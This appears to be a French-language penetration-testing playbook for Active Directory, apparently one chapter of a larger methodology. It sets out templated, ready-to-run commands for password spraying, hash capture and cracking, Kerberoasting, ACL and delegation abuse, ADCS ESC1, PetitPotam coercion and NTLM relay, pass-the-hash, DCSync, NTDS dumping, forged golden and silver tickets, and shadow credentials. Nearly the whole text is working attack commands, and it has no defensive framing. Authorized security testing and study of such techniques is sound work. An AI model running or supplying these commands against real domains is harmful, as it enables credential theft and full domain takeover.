# 3 - Active Directory

Cette phase couvre l'attaque d'un domaine Active Directory, depuis l'acquisition des premiers identifiants jusqu'à la domination complète du domaine. Le fil conducteur est presque toujours le même : obtenir un compte valide, cartographier le domaine avec **BloodHound**, puis suivre les chemins d'élévation révélés (ACL abusives, délégations, ADCS, coercition). Les commandes s'appuient principalement sur **NetExec**, **Impacket**, **Certipy** et **bloodyAD**.

!!! note "Jetons"
    Les jetons entre accolades sont substitués par vos valeurs avant exécution :
    `{DOMAIN}` (domaine, ex. `corp.local`), `{DC}` (contrôleur de domaine, FQDN ou IP), `{USER}` (utilisateur), `{PASS}` (mot de passe **ou** hash NT selon le flag `-H`/`-hashes`), `{IP}` (cible / DC), `<listener_ip>` (votre machine d'attaque).
    Le champ `needs` indique le prérequis de chaque étape :

    - **USER** - une liste d'utilisateurs (énumérée) est disponible.
    - **AUTH** - un compte de domaine valide (identifiants ou hash).
    - **HASH** - un hash NT exploitable (pass-the-hash / overpass-the-hash).
    - **ADMIN** - droits administrateur local sur la machine cible.
    - **DA** - droits élevés sur le domaine (Domain Admin / réplication DCSync).

---

## Credential acquisition

Acquisition d'identifiants (`creds`) - comment passer de **rien** à des identifiants exploitables. Le password spraying suppose une liste d'utilisateurs ; attention aux verrouillages de comptes.

!!! info "Références"
    - [HackTricks - Active Directory Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
    - [The Hacker Recipes - Password spraying](https://www.thehacker.recipes/ad/movement/credentials/bruteforcing/spraying)
    - [NetExec (dépôt)](https://github.com/Pennyw0rth/NetExec)

### Password spraying (1 password, N users - watch out for lockout) - _requiert : USER_

```sh
nxc smb {IP} -u users.txt -p 'Saison2025!' --continue-on-success | grep '[+]'
```

**Voir aussi :** [The Hacker Recipes - Password spraying](https://www.thehacker.recipes/ad/movement/credentials/bruteforcing/spraying) · [HackTricks - Password Spraying](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)

### Spray username = password - _requiert : USER_

```sh
nxc smb {IP} -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

**Voir aussi :** [NetExec (dépôt)](https://github.com/Pennyw0rth/NetExec) · [The Hacker Recipes - Password spraying](https://www.thehacker.recipes/ad/movement/credentials/bruteforcing/spraying)

### Crack harvested AS-REP / Kerberoast

```sh
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt   # AS-REP
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt    # TGS
```

**Voir aussi :** [hashcat - example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) · [The Hacker Recipes - Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)

### LLMNR/NBT-NS poisoning (NetNTLMv2 capture)

```sh
sudo responder -I <iface> -dwv
# then: hashcat -m 5600 hashes.txt rockyou.txt
```

**Voir aussi :** [The Hacker Recipes - LLMNR/NBT-NS/mDNS spoofing](https://www.thehacker.recipes/ad/movement/ntlm/capture) · [Responder (dépôt)](https://github.com/lgandx/Responder)

### GPP cpassword (SYSVOL, decryptable) - _requiert : AUTH_

```sh
nxc smb {DC} -u {USER} -p {PASS} -M gpp_password
nxc smb {DC} -u {USER} -p {PASS} -M gpp_autologin
```

**Voir aussi :** [The Hacker Recipes - Group Policy Preferences](https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policies-preferences)

---

## Domain enumeration (authenticated)

Énumération du domaine (`enum`) - une fois un compte valide obtenu, on cartographie l'AD pour identifier les chemins d'attaque.

!!! info "Références"
    - [HackTricks - Active Directory Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
    - [The Hacker Recipes - Recon](https://www.thehacker.recipes/ad/recon/)
    - [BloodHound (dépôt)](https://github.com/SpecterOps/BloodHound)

### BloodHound collection - _requiert : AUTH_

```sh
nxc ldap {DC} -u {USER} -p {PASS} --bloodhound -c all --dns-server {IP}
# alt: bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {IP} -c All
```

**Voir aussi :** [The Hacker Recipes - BloodHound](https://www.thehacker.recipes/ad/recon/bloodhound/) · [BloodHound.py (dépôt)](https://github.com/dirkjanm/BloodHound.py)

### Validate access machine by machine - _requiert : AUTH_

```sh
nxc smb targets.txt -u {USER} -p {PASS}
# (Pwn3d!) = local admin
```

**Voir aussi :** [NetExec (dépôt)](https://github.com/Pennyw0rth/NetExec)

### Sessions / logged-on users - _requiert : AUTH_

```sh
nxc smb {IP} -u {USER} -p {PASS} --sessions --loggedon-users
```

**Voir aussi :** [The Hacker Recipes - Recon](https://www.thehacker.recipes/ad/recon/)

---

## Kerberoast / AS-REP

Roasting Kerberos (`roasting`) - on récupère les tickets de service (TGS) ou les réponses AS-REP, puis on les casse hors-ligne.

!!! info "Références"
    - [HackTricks - Kerberoast](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html)
    - [The Hacker Recipes - Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)
    - [Impacket (dépôt)](https://github.com/fortra/impacket)

### Kerberoasting - _requiert : AUTH_

```sh
impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {IP} -request -outputfile kerb.txt
```

**Voir aussi :** [The Hacker Recipes - Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast) · [Impacket - GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

### AS-REP roasting (without password) - _requiert : USER_

```sh
impacket-GetNPUsers {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
```

**Voir aussi :** [The Hacker Recipes - ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast) · [HackTricks - ASREProast](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html)

### Targeted Kerberoast (via write ACL) - _requiert : AUTH_

```sh
targetedKerberoast.py -d {DOMAIN} -u {USER} -p {PASS} --dc-ip {IP}
```

**Voir aussi :** [The Hacker Recipes - Targeted Kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting) · [targetedKerberoast (dépôt)](https://github.com/ShutdownRepo/targetedKerberoast)

---

## ACL abuse & delegations

Abus d'ACL et délégations (`ACL/deleg`) - les chemins sont révélés par BloodHound. On suppose un compte de domaine disposant de droits d'écriture sur un objet.

!!! info "Références"
    - [HackTricks - ACL Persistence Abuse](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html)
    - [The Hacker Recipes - DACL abuse](https://www.thehacker.recipes/ad/movement/dacl/)
    - [bloodyAD (dépôt)](https://github.com/CravateRouge/bloodyAD)

### Force a password change (GenericAll/ForceChangePassword) - _requiert : AUTH_

```sh
net rpc password "<target>" "NewPass123!" -U "{DOMAIN}"/"{USER}"%"{PASS}" -S {DC}
# alt: bloodyAD -d {DOMAIN} -u {USER} -p {PASS} --host {DC} set password <target> NewPass123!
```

**Voir aussi :** [The Hacker Recipes - ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) · [bloodyAD (dépôt)](https://github.com/CravateRouge/bloodyAD)

### Add yourself to a group (GenericAll/AddMember) - _requiert : AUTH_

```sh
bloodyAD -d {DOMAIN} -u {USER} -p {PASS} --host {DC} add groupMember "<Group>" {USER}
```

**Voir aussi :** [The Hacker Recipes - AddMember](https://www.thehacker.recipes/ad/movement/dacl/addmember)

### RBCD (GenericWrite on a computer) - _requiert : AUTH_

```sh
impacket-addcomputer {DOMAIN}/{USER}:{PASS} -computer-name 'EVIL$' -computer-pass 'Evil123!'
impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write {DOMAIN}/{USER}:{PASS}
```

**Voir aussi :** [The Hacker Recipes - RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) · [HackTricks - Resource-based Constrained Delegation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html)

---

## ADCS (certificates)

Active Directory Certificate Services (`PKI`) - les modèles de certificats mal configurés (ESC1 à ESC8) permettent une élévation jusqu'à Domain Admin.

!!! info "Références"
    - [HackTricks - AD CS Domain Escalation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)
    - [The Hacker Recipes - AD CS](https://www.thehacker.recipes/ad/movement/adcs/)
    - [Certipy (dépôt)](https://github.com/ly4k/Certipy)

### Find vulnerable templates - _requiert : AUTH_

```sh
certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {IP} -vulnerable -stdout
```

**Voir aussi :** [The Hacker Recipes - Certificate templates](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates) · [Certipy (dépôt)](https://github.com/ly4k/Certipy)

### ESC1 - request a cert as admin - _requiert : AUTH_

```sh
certipy req -u {USER}@{DOMAIN} -p {PASS} -dc-ip {IP} -ca <CA> -template <Template> -upn administrator@{DOMAIN}
```

**Voir aussi :** [The Hacker Recipes - Certificate templates (ESC1)](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates) · [HackTricks - AD CS Domain Escalation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)

### Auth via the certificate → NT hash

```sh
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

**Voir aussi :** [The Hacker Recipes - AD CS](https://www.thehacker.recipes/ad/movement/adcs/) · [Certipy (dépôt)](https://github.com/ly4k/Certipy)

---

## Coercion / NTLM relay

Coercition et relais NTLM (`relay`) - on force l'authentification d'une machine, puis on relaie cette authentification vers un service cible. Privilégier les protocoles coercibles ci-dessous.

!!! info "Références"
    - [HackTricks - Active Directory Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
    - [The Hacker Recipes - MitM and coerced authentications](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/)
    - [Coercer (dépôt)](https://github.com/p0dalirius/Coercer)

### Scan coercible protocols - _requiert : AUTH_

```sh
# MS-RPRN=PrintBug | MS-EFSR=PetitPotam | MS-DFSNM=DFSCoerce | MS-FSRVP=ShadowCoerce
coercer scan -t {IP} -u {USER} -p {PASS} -d {DOMAIN}
```

**Voir aussi :** [The Hacker Recipes - MS-RPRN (PrintBug)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn) · [The Hacker Recipes - MS-DFSNM (DFSCoerce)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-dfsnm) · [Coercer (dépôt)](https://github.com/p0dalirius/Coercer)

### PetitPotam (often unauthenticated)

```sh
python3 PetitPotam.py -d {DOMAIN} <listener_ip> {IP}
```

**Voir aussi :** [The Hacker Recipes - MS-EFSR (PetitPotam)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr) · [PetitPotam (dépôt)](https://github.com/topotam/PetitPotam)

### NTLM relay to LDAPS (RBCD/shadow creds)

```sh
impacket-ntlmrelayx -t ldaps://{DC} --delegate-access -smb2support
```

**Voir aussi :** [The Hacker Recipes - NTLM relay](https://www.thehacker.recipes/ad/movement/ntlm/relay) · [HackTricks - RBCD](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html)

---

## Lateral movement

Déplacement latéral (`lateral`) - exécution de commandes à distance avec un mot de passe ou un hash NT (pass-the-hash).

!!! info "Références"
    - [HackTricks - Active Directory Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
    - [The Hacker Recipes - Pass the hash](https://www.thehacker.recipes/ad/movement/ntlm/pth)
    - [Impacket (dépôt)](https://github.com/fortra/impacket)

### Command execution (psexec/wmiexec) - _requiert : ADMIN_

```sh
impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{IP}
impacket-psexec {DOMAIN}/{USER}@{IP} -hashes :{PASS}
```

**Voir aussi :** [The Hacker Recipes - Pass the hash](https://www.thehacker.recipes/ad/movement/ntlm/pth) · [Impacket (dépôt)](https://github.com/fortra/impacket)

### One-shot command via netexec - _requiert : ADMIN_

```sh
nxc smb {IP} -u {USER} -p {PASS} -x 'whoami'
nxc smb {IP} -u {USER} -H {PASS} -x 'whoami'   # pass-the-hash
```

**Voir aussi :** [NetExec (dépôt)](https://github.com/Pennyw0rth/NetExec)

### Pass-the-hash (broad validation) - _requiert : HASH_

```sh
nxc smb targets.txt -u {USER} -H {PASS} --local-auth
```

**Voir aussi :** [The Hacker Recipes - Pass the hash](https://www.thehacker.recipes/ad/movement/ntlm/pth) · [NetExec (dépôt)](https://github.com/Pennyw0rth/NetExec)

---

## Domain domination

Domination du domaine (`domination`) - avec des droits de réplication (Domain Admin / DCSync), on extrait l'intégralité des secrets du domaine.

!!! info "Références"
    - [HackTricks - DCSync](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html)
    - [The Hacker Recipes - DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
    - [Impacket (dépôt)](https://github.com/fortra/impacket)

### DCSync (krbtgt + all hashes) - _requiert : DA_

```sh
impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{DC} -just-dc
```

**Voir aussi :** [The Hacker Recipes - DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) · [Impacket - secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

### Dump a single account (krbtgt) - _requiert : DA_

```sh
impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{DC} -just-dc-user krbtgt
```

**Voir aussi :** [The Hacker Recipes - DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)

### Golden Ticket - _requiert : DA_

```sh
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain {DOMAIN} Administrator
```

**Voir aussi :** [The Hacker Recipes - Golden ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden) · [HackTricks - Golden Ticket](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html)

### Dump NTDS.dit - _requiert : ADMIN_

```sh
impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{DC} -just-dc-ntlm
nxc smb {DC} -u {USER} -p {PASS} --ntds
```

**Voir aussi :** [The Hacker Recipes - NTDS](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds) · [NetExec (dépôt)](https://github.com/Pennyw0rth/NetExec)

---

## Tickets & delegations

Réutilisation de tickets et abus de délégations (`kerberos`) - souvent révélés par BloodHound.

!!! info "Références"
    - [HackTricks - Active Directory Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
    - [The Hacker Recipes - Kerberos delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations/)
    - [Impacket (dépôt)](https://github.com/fortra/impacket)

### Overpass-the-hash (NT hash → TGT) - _requiert : HASH_

```sh
impacket-getTGT {DOMAIN}/{USER} -hashes :{PASS}
export KRB5CCNAME={USER}.ccache
nxc smb {DC} -k --use-kcache
```

**Voir aussi :** [The Hacker Recipes - Overpass the hash](https://www.thehacker.recipes/ad/movement/kerberos/opth) · [HackTricks - Over Pass the Hash / Pass the Key](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key.html)

### Silver Ticket (service account hash) - _requiert : HASH_

```sh
impacket-ticketer -nthash {PASS} -domain-sid <SID> -domain {DOMAIN} -spn cifs/{DC} {USER}
```

**Voir aussi :** [The Hacker Recipes - Silver ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver) · [HackTricks - Silver Ticket](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html)

### Constrained delegation (S4U) - _requiert : AUTH_

```sh
impacket-getST -spn cifs/{DC} -impersonate Administrator {DOMAIN}/{USER}:{PASS}
```

**Voir aussi :** [The Hacker Recipes - Constrained delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained) · [HackTricks - Constrained Delegation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html) · [Impacket - getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)

### Pass-the-Ticket (.ccache) - _requiert : AUTH_

```sh
export KRB5CCNAME=ticket.ccache
klist
impacket-psexec -k -no-pass {DOMAIN}/{USER}@{DC}
```

**Voir aussi :** [The Hacker Recipes - Pass the ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt) · [HackTricks - Pass the Ticket](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html)

---

## Shadow Credentials

Shadow Credentials (`PKI`) - avec un droit d'écriture (`GenericWrite`) sur un compte et un ADCS actif, on ajoute une clé `msDS-KeyCredentialLink` pour s'authentifier en tant que la cible.

!!! info "Références"
    - [HackTricks - AD CS Domain Escalation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)
    - [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
    - [Certipy (dépôt)](https://github.com/ly4k/Certipy)

### Add a key (msDS-KeyCredentialLink) - _requiert : AUTH_

```sh
certipy shadow auto -u {USER}@{DOMAIN} -p {PASS} -account <target> -dc-ip {IP}
```

**Voir aussi :** [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials) · [Certipy (dépôt)](https://github.com/ly4k/Certipy)
